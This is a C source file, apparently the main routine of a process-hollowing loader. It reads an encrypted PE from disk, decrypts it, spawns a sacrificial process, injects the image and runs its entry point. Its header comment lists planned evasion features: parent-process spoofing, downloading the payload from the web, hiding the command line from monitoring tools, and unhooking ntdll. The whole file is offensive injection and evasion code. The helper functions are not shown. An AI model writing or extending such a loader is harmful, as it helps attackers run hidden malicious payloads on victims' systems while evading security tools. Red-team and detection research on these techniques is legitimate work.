#include "main.h"
#include "structs.h"


/*---------------------------------------------------
  Simple process hollowing example
  Features:
  1. Read an encrypted PE from disk
  2. Spawns a sacrificial process
     that will be hollowed
  3. Patching the PE's arguments in
     the PEB of the sacrificial proc

  TODO:
  1. Implement PPID spoofing
  2. Get the encrypted PE from web
  3. Path the ProcessParameters.CommandLine.Length
     as well to limit what ProcessHacker can read
  4. Unhook any DLLs that are being used (mainly ntdll)
     and implement custom GetProcAddress
---------------------------------------------------*/


NTAPIS NtAPIs = { 0 };


int main()
{
    CONTENT cnt = { 0 };
    PEHDRS PeHdrs = { 0 };
    HANDLE stdInWrite = NULL,
        stdOutRead = NULL;
    PROCESS_INFORMATION procInfo = { 0 };


    if (!InitAPIs()) {
        return 1;
    }

    //Read the PE from disk
    if (!GetPE(&cnt)) {
        return 1;
    }

    //Decrypt the PE's content
    if (!Crypt(&cnt)) {
        return 1;
    }

    //Parse the PE headers
    if (!InitPE(&PeHdrs, cnt)) {
        DEBUG_PRINT("[!] Failed parsing PE headers\n");
        return 1;
    }

    //Create sacrificial process and couple of pipes to get the output
    if (!CreateProc(&procInfo, &stdInWrite, &stdOutRead)) {
        return 1;
    }

    //Prepare the PE and inject it in the sacrificial process
    if (!PreparePE(procInfo, PeHdrs)) {
        return 1;
    }
 
    //Execute the PE's entrypoint in the remote process
    if (!ExecPE(procInfo, stdOutRead)) {
        return 1;
    }


    //Clean up
    NtAPIs.pNtClose(stdOutRead);
    NtAPIs.pNtClose(stdInWrite);

    return 0;
}
